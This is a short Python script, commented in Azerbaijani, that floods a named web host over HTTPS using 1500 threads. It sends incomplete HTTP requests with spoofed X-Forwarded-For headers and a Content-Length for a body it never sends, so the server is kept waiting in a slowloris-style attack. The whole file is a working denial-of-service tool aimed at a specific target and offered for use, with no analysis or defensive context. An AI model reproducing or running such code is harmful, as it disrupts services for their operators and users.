import socket
import ssl
import threading
import random
import time

TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1500 # Maksimum güc

def void_worker():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            
            # Bağlantını qururuq
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))
            
            # MULTIPLEXING: Bir bağlantıdan minlərlə "bitməyən" sorğu göndər
            for _ in range(100):
                path = f"/?v={random.random()}&id={random.randint(1,99999)}"
                # Serverə deyirik ki, "mən hələ bitirməmişəm, gözlə"
                payload = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"Content-Length: {random.randint(100, 1000)}\r\n" # Hilə: Datanı göndərmirik, gözlədirik
                    f"\r\n"
                ).encode()
                
                conn.send(payload)
                # Serveri kilitləyən o saniyələr:
                time.sleep(0.1) 
                
            time.sleep(10) # Bağlantını 10 saniyə açıq saxla
            conn.close()
        except:
            pass

def main():
    print(f"🔥 VOID PROTOCOL INITIALIZED: {TARGET_HOST}")
    for i in range(THREADS):
        threading.Thread(target=void_worker, daemon=True).start()
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
